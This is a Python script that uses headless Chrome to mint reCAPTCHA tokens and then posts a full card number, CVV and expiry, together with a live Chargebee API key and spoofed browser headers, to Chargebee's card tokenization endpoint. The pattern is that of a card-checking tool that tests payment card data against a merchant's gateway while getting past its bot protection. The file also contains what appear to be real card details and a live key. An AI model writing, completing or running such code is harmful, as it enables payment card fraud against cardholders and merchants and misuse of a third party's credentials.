
import requests
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import time

# Function to generate a fresh reCAPTCHA token
def get_recaptcha_token(site_key):
    # HTML content to load reCAPTCHA and generate a token
    html_content = f"""
    <html>
    <head>
        <script src="https://www.google.com/recaptcha/api.js?render={site_key}"></script>
        <script>
            function onLoad() {{
                grecaptcha.ready(function() {{
                    grecaptcha.execute('{site_key}', {{action: 'submit'}}).then(function(token) {{
                        document.getElementById('recaptchaToken').value = token;
                    }});
                }});
            }}
        </script>
    </head>
    <body onload="onLoad()">
        <input type="hidden" id="recaptchaToken" value="">
    </body>
    </html>
    """

    # Save the HTML to a temporary file
    with open("recaptcha.html", "w") as f:
        f.write(html_content)

    # Set up headless Chrome
    options = Options()
    options.add_argument("--headless")
    options.add_argument("--disable-gpu")
    driver = webdriver.Chrome(options=options)

    # Load the HTML file
    driver.get("file://" + "/path/to/recaptcha.html")  # Update with absolute path

    # Wait for the token to be generated (adjust time as needed)
    time.sleep(3)

    # Retrieve the token
    token = driver.find_element_by_id("recaptchaToken").get_attribute("value")
    driver.quit()

    return token

# Chargebee API endpoint
url = "https://xv-pacs.chargebee.com/api/js/v2/tokens/create_for_card"

# Headers (unchanged)
headers = {
    "accept": "application/json, text/plain, */*",
    "accept-encoding": "gzip, deflate, br, zstd",
    "accept-language": "en-US,en;q=0.9",
    "authorization": "Basic live_cupWXU7Rz11h04ocdLKnWzZ1wRGcdYemucn",
    "content-type": "application/x-www-form-urlencoded",
    "origin": "https://js.chargebee.com",
    "referer": "https://js.chargebee.com/",
    "sec-ch-ua": '"Chromium";v="132", "DuckDuckGo";v="132", "Not A(Brand";v="8"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-site",
    "sec-gpc": "1",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 Edg/132.0.0.0"
}

# Base payload (without recaptchaToken yet)
payload = {
    "card[number]": "5579100438105270",
    "card[cvv]": "325",
    "card[expiry_month]": "02",
    "card[expiry_year]": "29",
    "card[gateway_account_id]": "gw_AzZZDYU7ciRIk7oMe",
    "_jsapi_key": "live_cupWXU7Rz11h04ocdLKnWzZ1wRGcdYemucn"
}

# Replace with Chargebee's actual reCAPTCHA site key
site_key = "YOUR_CHARGEBEE_RECAPTCHA_SITE_KEY"

# Generate a fresh reCAPTCHA token
recaptcha_token = get_recaptcha_token(site_key)

# Add the fresh token to the payload
payload["recaptchaToken"] = recaptcha_token

# Send the POST request
response = requests.post(url, headers=headers, data=payload)

# Print the response
print(f"Status Code: {response.status_code}")
print(f"Response Text: {response.text}")